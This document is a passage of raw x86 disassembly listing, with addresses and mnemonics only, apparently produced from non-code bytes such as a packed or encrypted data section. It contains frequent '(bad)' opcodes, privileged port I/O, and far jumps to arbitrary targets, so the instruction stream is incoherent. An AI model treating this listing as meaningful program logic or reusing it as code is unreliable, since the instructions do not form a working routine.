  415a94:	stos   BYTE PTR es:[edi],al
  415a95:	pop    ds
  415a96:	sub    BYTE PTR [ecx+ebp*1],dh
  415a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9a:	test   DWORD PTR [edi-0x1c0f4d14],eax
  415aa0:	and    DWORD PTR [ebx-0x66bf6973],ecx
  415aa6:	mov    al,ds:0xd9028c24
  415aab:	xchg   ebx,eax
  415aac:	and    DWORD PTR [ebp+ebx*4+0x7a9a7566],ecx
  415ab3:	push   ebx
  415ab4:	and    al,0xbe
  415ab6:	imul   bp,WORD PTR [edi-0x3d],0xe7cb
  415abc:	xchg   esp,eax
  415abd:	scas   al,BYTE PTR es:[edi]
  415abe:	mov    es,WORD PTR [esi+edx*4+0x9]
  415ac2:	or     dl,BYTE PTR [ecx]
  415ac4:	aaa    
  415ac5:	push   ebp
  415ac6:	pop    ebx
  415ac7:	dec    ebp
  415ac8:	dec    ecx
  415ac9:	shl    DWORD PTR [edx],1
  415acb:	retf   
  415acc:	mov    edx,0xb12ca84d
  415ad1:	xor    eax,0xe908033f
  415ad6:	rcr    ecx,0x13
  415ad9:	adc    al,0x97
  415adb:	aaa    
  415adc:	int3   
  415add:	add    ch,BYTE PTR ds:0x7dce7b5f
  415ae3:	cmp    al,0xaa
  415ae5:	imul   ebp
  415ae7:	imul   esp,DWORD PTR [ebx+0x5744aa6d],0x48
  415aee:	out    dx,eax
  415aef:	cld    
  415af0:	repz jne 0x415aa4
  415af3:	sub    al,0x47
  415af5:	add    DWORD PTR [ecx+0x60],ebx
  415af8:	pop    ebx
  415af9:	push   eax
  415afa:	fwait
  415afb:	xchg   DWORD PTR [ebp-0x75],esp
  415afe:	adc    eax,0x4af4a450
  415b03:	retf   0x6ffa
  415b06:	and    eax,0x16bc20db
  415b0b:	and    eax,0x37a990f3
  415b10:	fdivr  QWORD PTR [ecx+0x7]
  415b13:	xchg   BYTE PTR [edi+eiz*8],al
  415b16:	mov    al,ds:0x5831cab6
  415b1b:	(bad)  
  415b1c:	cs pop edx
  415b1e:	or     DWORD PTR [edi],esp
  415b20:	aaa    
  415b21:	sbb    esp,DWORD PTR [edi]
  415b23:	sub    BYTE PTR [edx+0x57],bl
  415b26:	pushf  
  415b27:	jg     0x415b0f
  415b29:	mov    bh,ch
  415b2b:	jb     0x415ab8
  415b2d:	jns    0x415ae2
  415b2f:	ins    BYTE PTR es:[edi],dx
  415b30:	fisubr DWORD PTR [esi-0x2615eac4]
  415b36:	xor    esi,ebx
  415b38:	jl     0x415b24
  415b3a:	lock push edx
  415b3c:	mov    al,ds:0x74a58e6c
  415b41:	test   DWORD PTR [ecx-0x46],esp
  415b44:	fcmovbe st,st(7)
  415b46:	in     al,dx
  415b47:	add    dl,al
  415b49:	out    dx,al
  415b4a:	sub    BYTE PTR [ecx+0x4786db9b],ah
  415b50:	sbb    ch,cl
  415b52:	sar    BYTE PTR [esi-0x41],cl
  415b55:	pushf  
  415b56:	fistp  DWORD PTR [esi-0x10]
  415b59:	std    
  415b5a:	add    al,0x4a
  415b5c:	ret    
  415b5d:	das    
  415b5e:	mov    ecx,0x4ed787ae
  415b63:	imul   ecx,DWORD PTR [ebx-0xe0ce87f],0xffffff9b
  415b6a:	mov    ah,0x1c
  415b6c:	outs   dx,DWORD PTR ds:[esi]
  415b6d:	test   al,0x5d
  415b6f:	lds    esp,FWORD PTR [ebx+0x3ade051]
  415b75:	(bad)  
  415b76:	cld    
  415b77:	dec    ecx
  415b78:	daa    
  415b79:	jae    0x415b6e
  415b7b:	(bad)  
  415b7c:	push   ss
  415b7d:	shr    BYTE PTR [ebx+0x5a],1
  415b80:	cli    
  415b81:	retf   
  415b82:	outs   dx,DWORD PTR ds:[esi]
  415b83:	dec    edx
  415b84:	xor    edi,DWORD PTR es:[ecx-0x59]
  415b88:	jle    0x415baa
  415b8a:	push   ebx
  415b8b:	mov    cl,0x10
  415b8d:	mov    ebx,0xc5b998f6
  415b92:	or     BYTE PTR [edx],0x4c
  415b95:	lods   eax,DWORD PTR ds:[esi]
  415b96:	fadd   DWORD PTR [ecx+edi*8+0x9]
  415b9a:	sbb    al,0x59
  415b9c:	retf   0xf01a
  415b9f:	icebp  
  415ba0:	xor    ebx,DWORD PTR [eax+0x753400b0]
  415ba6:	cmp    ebp,esi
  415ba8:	cwde   
  415ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415baa:	test   ax,0xcd54
  415bae:	pop    es
  415baf:	popa   
  415bb0:	adc    al,0x15
  415bb2:	data16 mov bh,0xcb
  415bb5:	sub    ecx,DWORD PTR [edi+0x24]
  415bb8:	jmp    0x410595fd
  415bbd:	js     0x415bba
  415bbf:	es adc eax,0xa6514b49
  415bc5:	jp     0x415b51
  415bc7:	pusha  
  415bc8:	(bad)  
  415bc9:	adc    DWORD PTR [edx],esi
  415bcb:	mov    esi,0x261a34fa
  415bd0:	mov    al,0x69
  415bd2:	cdq    
  415bd3:	or     eax,DWORD PTR [edx+0x52]
  415bd6:	sar    dl,0xf2
  415bd9:	mov    ds:0xf14a924c,al
  415bde:	clc    
  415bdf:	xchg   BYTE PTR [edx],bl
  415be1:	cmp    eax,0x20e6e739
  415be6:	(bad)  
  415be7:	lds    ecx,FWORD PTR [edi]
  415be9:	pop    eax
  415bea:	imul   ecx,DWORD PTR [edi-0x7aeab9db],0x8807da71
  415bf4:	aam    0x33
  415bf6:	cld    
  415bf7:	arpl   WORD PTR [esi],sp
  415bf9:	xchg   edi,eax
  415bfa:	es push es
  415bfc:	nop
  415bfd:	adc    BYTE PTR [ecx],bl
  415bff:	(bad)  
  415c00:	sbb    eax,0xdef277a2
  415c05:	and    al,0x9
  415c07:	pop    edi
  415c08:	lds    ebx,FWORD PTR [ecx]
  415c0a:	dec    BYTE PTR [edi+edx*8]
  415c0d:	dec    eax
  415c0e:	scas   eax,DWORD PTR es:[edi]
  415c0f:	fdivr  QWORD PTR cs:[ebx-0x15]
  415c13:	jp     0x415bc8
  415c15:	mov    edx,0x20f1ff6a
  415c1a:	je     0x415c28
  415c1c:	imul   ebp,DWORD PTR [ebx-0x35],0xffffffe4
  415c20:	imul   ebx,DWORD PTR [esi+0x6d],0x8c481bdf
  415c27:	int3   
  415c28:	or     dh,BYTE PTR [ecx-0x492bcc68]
  415c2e:	lahf   
  415c2f:	femms  
  415c31:	fcomp  st(7)
  415c33:	std    
  415c34:	cmp    eax,0xad7fad4
  415c39:	jmp    0x3ec8dd14
  415c3e:	mov    ebx,0x6436ee90
  415c43:	jmp    0x39c:0x30d063d9
  415c4a:	nop
  415c4b:	cdq    
  415c4c:	arpl   WORD PTR [esi],sp
  415c4e:	fwait
  415c4f:	lods   al,BYTE PTR ds:[esi]
  415c50:	iret   
  415c51:	addr16 inc edx
  415c53:	dec    edi
  415c54:	inc    edi
  415c55:	add    eax,0x4bfb8204
  415c5a:	imul   edi,DWORD PTR [ebx+0x77],0xfffffff5
  415c5e:	jno    0x415c9c
  415c60:	cwde   
  415c61:	in     eax,dx
  415c62:	or     cl,bl
  415c64:	add    DWORD PTR [ebp-0x47887850],eax
  415c6a:	jbe    0x415bef
  415c6c:	push   esp
  415c6d:	ss adc al,0x2c
  415c70:	fistp  DWORD PTR [edx]
  415c72:	sbb    al,0x80
  415c74:	pushf  
  415c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c76:	mov    BYTE PTR [ebp+0x2a7d3a0a],ah
  415c7c:	cdq    
  415c7d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415c7f:	lods   al,BYTE PTR ds:[esi]
  415c81:	mov    bl,0xe0
  415c83:	pop    edx
  415c84:	mov    cl,0x6f
  415c86:	stos   BYTE PTR es:[edi],al
  415c87:	stc    
  415c88:	push   ss
  415c89:	sub    al,0x75
  415c8b:	or     al,0x92
  415c8d:	je     0x415c2b
  415c8f:	mov    edx,0x2cd3514b
  415c94:	fs push esi
  415c96:	add    eax,0x54e3eb5c
  415c9b:	shr    DWORD PTR [ebx-0x60],cl
  415c9e:	mov    esp,0x1137903f
  415ca3:	test   ah,dh
  415ca5:	mov    dl,0x83
  415ca7:	inc    edx
  415ca8:	xor    al,0x1
  415caa:	popa   
  415cab:	pop    esp
  415cac:	test   BYTE PTR ds:0xc052e24b,dh
  415cb2:	test   BYTE PTR [edx+0x4e3b8fd],ah
  415cb8:	jno    0x415c7d
  415cba:	mov    esp,0x3fb90aca
  415cbf:	call   0xe9:0xb54d68c2
  415cc6:	and    ch,dl
  415cc8:	jnp    0x415cc9
  415cca:	les    edx,FWORD PTR [eax]
  415ccc:	inc    ebx
  415ccd:	test   ecx,edi
  415ccf:	fcomp  QWORD PTR ds:0x24afed1c
  415cd5:	xor    cl,BYTE PTR [ebx-0x1]
  415cd8:	scas   eax,DWORD PTR es:[edi]
  415cd9:	(bad)  
  415cda:	out    dx,eax
  415cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cdc:	push   ebx
  415cdd:	inc    eax
  415cde:	scas   eax,DWORD PTR es:[edi]
  415cdf:	jae    0x415cf4
  415ce1:	in     eax,0xe7
  415ce3:	leave  
  415ce4:	jl     0x415d1c
  415ce6:	push   cs
  415ce7:	enter  0xea84,0xfd
  415ceb:	pop    edi
  415cec:	nop
  415ced:	jns    0x415d58
  415cef:	push   ss
  415cf0:	in     al,dx
  415cf1:	jbe    0x415ce1
  415cf3:	fidiv  WORD PTR [eax+0x2]
  415cf6:	aas    
  415cf7:	pop    ebx
  415cf8:	push   es
  415cf9:	shl    DWORD PTR [ecx],1
  415cfb:	xor    al,0xb3
  415cfd:	inc    ecx
  415cfe:	push   esi
  415cff:	add    esi,DWORD PTR [edx]
  415d01:	out    0xf3,eax
  415d03:	pop    esi
  415d04:	stos   BYTE PTR es:[edi],al
  415d05:	push   ebp
  415d06:	jo     0x415d60
  415d08:	cmp    ebx,DWORD PTR [ebx]
  415d0a:	das    
  415d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d0c:	sub    al,0xd4
  415d0e:	mov    dh,0x2d
  415d10:	sub    al,0x16
  415d12:	lock idiv DWORD PTR [edi-0x2b8c1d54]
  415d19:	call   FWORD PTR [eax]
  415d1b:	xchg   ebp,eax
  415d1c:	sbb    al,0x27
  415d1e:	sti    
  415d1f:	adc    ah,BYTE PTR [edx+eiz*8-0x2cf447dc]
  415d26:	sbb    BYTE PTR [edi+edx*8+0x78],ch
  415d2a:	and    bh,BYTE PTR [edx-0x24eec3da]
  415d30:	cmc    
  415d31:	clc    
  415d32:	iret   
  415d33:	xchg   esi,eax
  415d34:	scas   al,BYTE PTR es:[edi]
  415d35:	inc    ebp
  415d36:	fstp   QWORD PTR [edi]
  415d38:	sti    
  415d39:	(bad)
  415d3d:	fist   WORD PTR [eax+0x21]
  415d40:	in     eax,0x18
  415d42:	dec    eax
  415d43:	lock stc 
  415d45:	(bad)  
  415d46:	mov    ds:0xf3a1d08b,al
  415d4b:	or     ah,al
  415d4d:	scas   al,BYTE PTR es:[edi]
  415d4e:	pop    edi
  415d4f:	jns    0x415d2e
  415d51:	inc    BYTE PTR [ecx+0x60a27e95]
  415d57:	outs   dx,BYTE PTR ds:[esi]
  415d58:	and    al,0x5c
  415d5a:	fistp  WORD PTR [esi+eax*4-0x34a8c38f]
  415d61:	hlt    
  415d62:	xor    bh,ah
  415d64:	and    eax,0x4f3a99e7
  415d69:	sbb    cl,0x27
  415d6c:	inc    ecx
  415d6d:	out    0x63,eax
  415d6f:	sbb    esi,esp
  415d71:	pop    ds
  415d72:	daa    
  415d73:	inc    ecx
  415d74:	jns    0x415dbd
  415d76:	lods   eax,DWORD PTR ds:[esi]
  415d77:	pusha  
  415d78:	xchg   ebx,eax
  415d79:	cmc    
  415d7a:	adc    eax,0xe3fe35a0
  415d7f:	das    
  415d80:	push   es
  415d81:	mov    cl,0xe8
  415d83:	fwait
  415d84:	mov    ds:0x6738eb59,eax
  415d89:	inc    ebx
  415d8a:	imul   eax,DWORD PTR [edx+0x27],0xb3bd656c
  415d91:	rcr    dl,cl
  415d93:	gs aad 0x5d
  415d96:	pop    ss
  415d97:	xlat   BYTE PTR ds:[ebx]
  415d98:	fst    st(5)
  415d9a:	ins    BYTE PTR es:[edi],dx
  415d9b:	call   0xd92a1037
  415da0:	xchg   DWORD PTR [esi+edx*2-0x775490a8],ebp
  415da7:	jae    0x415de8
  415da9:	scas   eax,DWORD PTR es:[edi]
  415daa:	adc    eax,0xc0030246
  415daf:	xchg   ch,bh
  415db1:	inc    edi
  415db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db3:	mov    cl,0x69
  415db5:	jb     0x415d44
  415db7:	pop    ds
  415db8:	ds lock std 
  415dbb:	add    edx,DWORD PTR [ecx+0x5b7520a1]
  415dc1:	and    bl,BYTE PTR [ebp+0x5c]
  415dc4:	fs jae 0x415e39
  415dc7:	inc    edi
  415dc8:	push   eax
  415dc9:	jno    0x415d91
  415dcb:	dec    ebp
  415dcc:	sahf   
  415dcd:	xor    DWORD PTR [ebp+0x12],ebx
  415dd0:	inc    ebp
  415dd1:	nop
  415dd2:	push   0xcfbc0ad4
  415dd7:	inc    edi
  415dd8:	cmp    eax,0xbcd7451
  415ddd:	jmp    0xfd8bada9
  415de2:	xchg   ebx,edx
  415de4:	mov    ecx,0x47fe1f63
  415de9:	leave  
  415dea:	ficomp DWORD PTR [eax+0x2ecbf5ef]
  415df0:	in     al,dx
  415df1:	push   ebx
  415df2:	pop    edi
  415df3:	mov    ds:0xe6e484b8,eax
  415df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df9:	fs inc edi
  415dfb:	into   
  415dfc:	xchg   dh,dh
  415dfe:	lea    ebx,[eax+0x58]
  415e01:	dec    esi
  415e02:	or     bl,BYTE PTR [eax-0x7db59123]
  415e08:	sahf   
  415e09:	and    DWORD PTR ss:[ebx+edx*8],esp
  415e0d:	pusha  
  415e0e:	mov    esi,0x70991fc0
  415e13:	out    0xac,eax
  415e15:	iret   
  415e16:	(bad)  
  415e18:	out    0x5b,eax
  415e1a:	jae    0x415dd1
  415e1c:	out    dx,eax
  415e1d:	dec    ebx
  415e1e:	fistp  QWORD PTR [eax-0x7bbb3c57]
  415e24:	cdq    
  415e25:	mov    ds:0x6a92f5dc,al
  415e2a:	test   DWORD PTR [ebx+0x175910d7],ebx
  415e30:	out    0x3a,eax
  415e32:	shl    DWORD PTR [edx+0x7],cl
  415e35:	jnp    0x415dd5
  415e37:	push   ds
  415e38:	jmp    0x222e:0xc94ee244
  415e3f:	jnp    0x415e7d
  415e41:	repnz cmp BYTE PTR [edx],bh
  415e44:	call   FWORD PTR [ebx-0x4dced9e7]
  415e4a:	xor    eax,0xe626694c
  415e4f:	in     al,0x6
  415e51:	add    dl,ch
  415e53:	daa    
  415e54:	jl     0x415e9f
  415e56:	jmp    0x75566b0
  415e5b:	inc    edx
  415e5c:	sar    DWORD PTR [ebp+0x13],1
  415e5f:	jge    0x415e38
  415e61:	fwait
  415e62:	push   0xffffffc1
  415e64:	add    BYTE PTR [ebp-0x17],bl
  415e67:	pop    ecx
  415e68:	xor    DWORD PTR [esi+0x10509c02],edi
  415e6e:	pop    ds
  415e6f:	push   cs
  415e70:	add    al,0xdf
  415e72:	mov    ecx,0xfe1e80bb
  415e77:	lods   eax,DWORD PTR ds:[esi]
  415e78:	rcl    DWORD PTR [esi+0x67],1
  415e7b:	jmp    0x9edfed05
  415e80:	je     0x415e89
  415e82:	sub    DWORD PTR [eax+0x41],esi
  415e85:	fyl2x  
  415e87:	sbb    BYTE PTR [edx-0x5a1ac13b],bh
  415e8d:	aaa    
  415e8e:	fwait
  415e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e90:	push   ebp
  415e91:	mov    ah,0xc8
  415e93:	or     BYTE PTR [eiz*4-0x6e76799a],cl
  415e9a:	xlat   BYTE PTR ds:[ebx]
  415e9b:	adc    BYTE PTR [edx-0x2e35dc59],cl
  415ea1:	ss hlt 
  415ea3:	loopne 0x415ea1
  415ea5:	adc    al,0x43
  415ea7:	neg    BYTE PTR [esi+0x710f27fd]
  415ead:	xchg   esi,eax
  415eae:	rol    DWORD PTR [esi],1
  415eb0:	rcr    edi,cl
  415eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb3:	das    
  415eb4:	ins    BYTE PTR es:[edi],dx
  415eb5:	not    edx
  415eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eb8:	ds sub al,0x5a
  415ebb:	icebp  
  415ebc:	retf   0x99c9
  415ebf:	in     eax,dx
  415ec0:	xor    ch,dh
  415ec2:	aad    0xe
  415ec4:	ins    DWORD PTR es:[edi],dx
  415ec5:	les    esi,FWORD PTR [ebx+0x25]
  415ec8:	int3   
  415ec9:	inc    edx
  415eca:	push   ebp
  415ecb:	push   esi
  415ecc:	div    DWORD PTR [edi-0x6a]
  415ecf:	(bad)  [eax+0x87a3943]
  415ed5:	mov    esi,0xb741ef83
  415eda:	je     0x415e93
  415edc:	stos   DWORD PTR es:[edi],eax
  415edd:	std    
  415ede:	outs   dx,DWORD PTR ds:[esi]
  415edf:	lea    edx,[esi+0x255bb357]
  415ee5:	aas    
  415ee6:	inc    ebp
  415ee7:	iret   
  415ee8:	mov    esp,0xb66357a5
  415eed:	jge    0x415e7d
  415eef:	not    DWORD PTR [edi]
  415ef1:	push   DWORD PTR [ecx-0x45]
  415ef4:	test   al,0x49
  415ef6:	xchg   ecx,eax
  415ef7:	dec    ebp
  415ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef9:	inc    edi
  415efa:	adc    eax,0x6c611f34
  415eff:	adc    BYTE PTR [esi+0x66],bl
  415f02:	inc    esi
  415f03:	mov    edx,ecx
  415f05:	js     0x415ed1
  415f07:	mov    BYTE PTR ds:0xab8ed2e6,al
  415f0d:	mov    dh,0x6f
  415f0f:	int3   
  415f10:	inc    edx
  415f11:	and    bh,0x47
  415f14:	cli    
  415f15:	pop    es
  415f16:	icebp  
  415f17:	in     al,dx
  415f18:	inc    edx
  415f19:	xlat   BYTE PTR ds:[ebx]
  415f1a:	loop   0x415f32
  415f1c:	mov    ecx,0x7a6e7ef6
  415f21:	dec    esi
  415f22:	pop    edx
  415f23:	cs pop edx
  415f25:	or     eax,0x49d27006
  415f2a:	jp     0x415f4e
  415f2c:	mov    esp,0x50f08b86
  415f31:	jle    0x415fa5
  415f33:	out    dx,eax
  415f34:	sti    
  415f35:	cmp    eax,esi
  415f37:	lea    esi,[esi-0x59]
  415f3a:	cmp    ecx,DWORD PTR ds:0x893ca347
  415f40:	unpcklps xmm4,xmm1
  415f43:	dec    edi
  415f44:	xchg   dl,dh
  415f46:	in     eax,dx
  415f47:	jae    0x415fbc
  415f49:	fidivr DWORD PTR [edi-0x5d]
  415f4c:	cmp    DWORD PTR [edi+0x7c],ebp
  415f4f:	dec    esp
  415f50:	rol    DWORD PTR [ebx],0x5f
  415f53:	add    al,0xa7
  415f55:	push   edi
  415f56:	inc    edi
  415f57:	jmp    0x136d:0x68c798eb
  415f5e:	aas    
  415f5f:	push   edx
  415f60:	js     0x415f0c
  415f62:	and    al,0x86
  415f64:	adc    al,0xde
  415f66:	xchg   esi,eax
  415f67:	aam    0xc9
  415f69:	out    dx,al
  415f6a:	mov    esp,0xb8882b7e
  415f6f:	jg     0x415f5d
  415f71:	ins    BYTE PTR es:[edi],dx
  415f72:	add    DWORD PTR [ecx+0x7a9631b8],0xb24cd7a9
  415f7c:	arpl   WORD PTR [eax],ax
  415f7e:	je     0x415fe0
  415f80:	outs   dx,BYTE PTR ss:[esi]
  415f82:	repz sub edx,DWORD PTR [esi+0x31552fe7]
  415f89:	(bad)  
  415f8a:	mov    esp,0x1de94d50
  415f8f:	lahf   
  415f90:	mov    dl,0xd1
  415f92:	dec    esi
  415f93:	ret    0x3039
  415f96:	and    al,0xed
  415f98:	into   
  415f99:	or     ebx,esi
  415f9b:	push   esp
  415f9c:	out    0x3,al
  415f9e:	xchg   esp,eax
  415f9f:	xor    ah,cl
  415fa1:	jmp    DWORD PTR [eax-0x4a]
  415fa4:	cmp    al,0xb1
  415fa6:	push   ss
  415fa7:	in     al,dx
  415fa8:	add    al,0x8f
  415faa:	sbb    ecx,DWORD PTR [eax-0x39]
  415fad:	mov    al,BYTE PTR [edi+0x5ac266a1]
  415fb3:	and    esi,ebp
  415fb5:	fs or  ah,cl
  415fb8:	lods   eax,DWORD PTR ds:[esi]
  415fb9:	or     BYTE PTR [edx-0x76],0xe2
  415fbd:	in     eax,0x4a
  415fbf:	ins    DWORD PTR es:[edi],dx
  415fc0:	(bad)  
  415fc1:	out    dx,al
  415fc2:	jecxz  0x415f9c
  415fc4:	dec    eax
  415fc5:	jb     0x415f49
  415fc7:	push   ebx
  415fc8:	mov    esp,0x9b0e50f3
  415fcd:	jno    0x415fb7
  415fcf:	addr16 das 
  415fd1:	popf   
  415fd2:	arpl   WORD PTR [esi+0x51],bp
  415fd5:	(bad)  
  415fd6:	sub    al,0x98
  415fd8:	enter  0xb7f9,0x95
  415fdc:	and    BYTE PTR [ebp-0x282acecf],bh
  415fe2:	xor    BYTE PTR [esi+0x23],bl
  415fe5:	jg     0x41604f
  415fe7:	ss cmp ecx,ecx
  415fea:	data16 cs mov ah,0x11
  415fee:	and    cl,BYTE PTR [ecx+0x1b9ff16d]
  415ff4:	(bad)  
  415ff5:	cmp    DWORD PTR [ebp-0x5f],edi
  415ff8:	cmp    BYTE PTR [ebp-0x5ce793bb],0x81
  415fff:	and    esi,DWORD PTR [ebx+0x6a481e6c]
  416005:	aad    0x79
  416007:	es pop ebp
  416009:	push   edi
  41600a:	sub    al,0x31
  41600c:	xchg   ecx,eax
  41600d:	test   DWORD PTR [ecx],ecx
  41600f:	jp     0x41607d
  416011:	fcmove st,st(2)
  416013:	inc    eax
  416014:	out    dx,eax
  416015:	mov    eax,ds:0x8838d71e
  41601a:	xlat   BYTE PTR ds:[ebx]
  41601b:	dec    ebp
  41601c:	xchg   BYTE PTR [ecx-0x336ac00],dh
  416022:	dec    edi
  416023:	pop    eax
  416024:	xor    BYTE PTR ds:0xbd93871e,bl
  41602a:	cmp    DWORD PTR [edi-0x28],0xfffffffb
  41602e:	fimul  DWORD PTR [edi+0x4d6465b4]
  416034:	dec    ebp
  416035:	shl    DWORD PTR [edi-0x32],1
  416038:	cmp    ch,dh
  41603a:	add    al,0x37
  41603c:	leave  
  41603d:	mov    eax,0xc297df95
  416042:	push   ss
  416043:	xchg   ebp,eax
  416044:	(bad)  
  416045:	jb     0x415ff9
  416047:	pop    ebx
  416048:	and    ch,BYTE PTR [ebx]
  41604a:	xlat   BYTE PTR ds:[ebx]
  41604b:	(bad)  
  41604c:	sar    DWORD PTR [esi-0x3d],1
  41604f:	add    dh,BYTE PTR [eax-0x19]
  416052:	inc    ebx
  416053:	xchg   BYTE PTR [esi+0x7a],bl
  416056:	xchg   ebp,eax
  416057:	stos   BYTE PTR es:[edi],al
  416058:	cwde   
  416059:	add    edi,ebp
  41605b:	mov    bh,0xf2
  41605d:	mov    eax,0x716404f8
  416062:	xor    bh,BYTE PTR [edi+ecx*2]
  416065:	repnz in eax,0x78
  416068:	mov    dh,0xd7
  41606a:	cdq    
  41606b:	out    dx,eax
  41606c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606d:	ror    BYTE PTR [ebp+0x28],cl
  416070:	adc    ch,dl
  416072:	inc    ebp
  416073:	fisubr WORD PTR [eax-0x45]
  416076:	fimul  DWORD PTR ds:0xd001e679
  41607c:	rol    BYTE PTR [esi-0x70],0x4c
  416080:	out    0x12,eax
  416082:	ja     0x4160dc
  416084:	inc    ebx
  416085:	jne    0x41607e
  416087:	add    esi,0xca107dc8
  41608d:	cmp    dl,ah
  41608f:	fist   WORD PTR [edi-0x461ba2a1]
  416095:	ret    0xba54
  416098:	(bad)  
  416099:	lock sub esi,esi
  41609c:	cld    
  41609d:	es out dx,eax
  41609f:	fwait
  4160a0:	hlt    
  4160a1:	jp     0x4160ce
  4160a3:	sub    DWORD PTR [esi-0x177cfc44],ebp
  4160a9:	jg     0x4160be
  4160ab:	pop    edi
  4160ac:	inc    esi
  4160ad:	dec    ecx
  4160ae:	and    edx,DWORD PTR [edx]
  4160b0:	jl     0x41608a
  4160b2:	int3   
  4160b3:	gs (bad) 
  4160b5:	jo     0x41610e
  4160b7:	dec    edx
  4160b8:	adc    esp,DWORD PTR [ebp+0x2ccbdfb6]
  4160be:	out    0x2b,al
  4160c0:	stos   DWORD PTR es:[edi],eax
  4160c1:	retf   0xeb25
  4160c4:	sbb    esp,DWORD PTR [edi]
  4160c6:	jp     0x4160a2
  4160c8:	fst    QWORD PTR [edx+0x7a]
  4160cb:	out    dx,al
  4160cc:	mov    ch,BYTE PTR [ebp-0x6e]
  4160cf:	out    dx,al
  4160d0:	sbb    BYTE PTR [ecx-0x1b],cl
  4160d3:	jmp    0xb68f:0xd9348e03
  4160da:	arpl   WORD PTR ds:0xae1fa9ea,sp
  4160e0:	out    0x42,eax
  4160e2:	sbb    BYTE PTR ds:[edi+0x426ba913],bl
  4160e9:	dec    ebp
  4160ea:	mov    BYTE PTR [edx],ah
  4160ec:	arpl   WORD PTR [edx+0x12a13a53],di
  4160f2:	or     ch,BYTE PTR [edi+edx*4]
  4160f5:	test   al,0xda
  4160f7:	dec    ecx
  4160f8:	inc    esp
  4160f9:	jnp    0x4160cd
  4160fb:	or     eax,0x236f1d01
  416100:	stc    
  416101:	inc    esp
  416102:	ja     0x41616c
  416104:	loope  0x41615c
  416106:	adc    DWORD PTR [ebp-0x27],edx
  416109:	mov    ch,0x49
  41610b:	inc    edi
  41610c:	add    dh,ah
  41610e:	(bad)  
  41610f:	push   ebp
  416110:	sbb    eax,0x2293175b
  416115:	cdq    
  416116:	xchg   ebp,eax
  416117:	ins    DWORD PTR es:[edi],dx
  416118:	popf   
  416119:	hlt    
  41611a:	in     eax,dx
  41611b:	push   edi
  41611c:	or     ch,ch
  41611e:	iret   
  41611f:	enter  0xdad3,0x5d
  416123:	popf   
  416124:	sbb    al,0x16
  416126:	cld    
  416127:	aam    0x59
  416129:	add    ax,0xfff1
  41612d:	aad    0xd8
  41612f:	pop    ecx
  416130:	jnp    0x41617c
  416132:	enter  0xc459,0x97
  416136:	xchg   ecx,eax
  416137:	or     ebx,ebp
  416139:	xchg   esi,eax
  41613a:	test   BYTE PTR [esp+edx*4-0x5],0x8e
  41613f:	jmp    0x3154:0x179b790d
  416146:	push   ebx
  416147:	imul   esi,esp,0x65cb012d
  41614d:	daa    
  41614e:	add    al,0x94
  416150:	add    cl,ah
  416152:	xchg   ebp,eax
  416153:	clc    
  416154:	ror    DWORD PTR [ebx],0x1
  416157:	(bad)  [esi+0x75]
  41615a:	test   DWORD PTR [ecx-0x3],0x1fb384fe
  416161:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416163:	push   edi
  416164:	ins    BYTE PTR es:[edi],dx
  416165:	and    al,0xc3
  416167:	(bad)  [ebx+0x5b]
  41616a:	sahf   
  41616b:	xchg   dh,cl
  41616d:	leave  
  41616e:	adc    eax,0xc88f8183
  416173:	das    
  416174:	push   cs
  416175:	rcr    DWORD PTR [edi+0x69],cl
  416178:	int3   
  416179:	cmc    
  41617a:	jg     0x41612a
  41617c:	mov    eax,DWORD PTR [ebp-0x6bba997b]
  416182:	lods   eax,DWORD PTR ss:[esi]
  416184:	xchg   edx,eax
  416185:	xor    eax,0x3bc6c2f7
  41618a:	sar    ch,1
  41618c:	pushf  
  41618d:	push   ecx
  41618e:	(bad)  
  41618f:	(bad)  
  416191:	call   0x68052bc4
  416196:	add    ebx,DWORD PTR [ecx+0x33d1fc72]
  41619c:	enter  0x271d,0x26
  4161a0:	dec    edx
  4161a1:	mov    DWORD PTR [edi-0x6238e604],edi
  4161a7:	repnz pop esi
  4161a9:	push   esp
  4161aa:	ficomp WORD PTR [eax-0x3b90d595]
  4161b0:	sbb    al,0xcd
  4161b2:	je     0x41615f
  4161b4:	mov    eax,gs:0x65927dc0
  4161ba:	fscale 
  4161bc:	sahf   
  4161bd:	jns    0x416239
  4161bf:	jl     0x416182
  4161c1:	inc    eax
  4161c2:	or     eax,0x8a0a8b76
  4161c7:	and    DWORD PTR [esi-0x1f],0xaba3aa92
  4161ce:	inc    esp
  4161cf:	mov    ebx,0xb7b4a13b
  4161d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161d5:	pushf  
  4161d6:	ins    BYTE PTR es:[edi],dx
  4161d7:	add    DWORD PTR [eax+edi*8-0x335ee41f],0x332c5c00
  4161e2:	call   0xbf3fde67
  4161e7:	cwde   
  4161e8:	ficom  WORD PTR [eax+0x49]
  4161eb:	pop    edi
  4161ec:	cs lock xchg edx,ebx
  4161f0:	scas   eax,DWORD PTR es:[edi]
  4161f1:	or     DWORD PTR [ebx-0x22],ebx
  4161f4:	cmp    bl,BYTE PTR [eax+0x3735eab3]
  4161fa:	loope  0x41623f
  4161fc:	pop    edi
  4161fd:	and    al,0xfe
  4161ff:	mov    edi,0x9420ad8d
  416204:	cmp    DWORD PTR [esi],0xffffffd7
  416207:	sbb    al,0x25
  416209:	or     dl,ch
  41620b:	sbb    dh,BYTE PTR [esi-0x281e4ae6]
  416211:	daa    
  416212:	mov    eax,0xf5a41e54
  416217:	dec    ebp
  416218:	jo     0x41624b
  41621a:	cwde   
  41621b:	fsubr  st(4),st
  41621d:	sub    al,0xa9
  41621f:	sbb    DWORD PTR [edi+0x76],0x721d79d5
  416226:	ret    0xc096
  416229:	pop    es
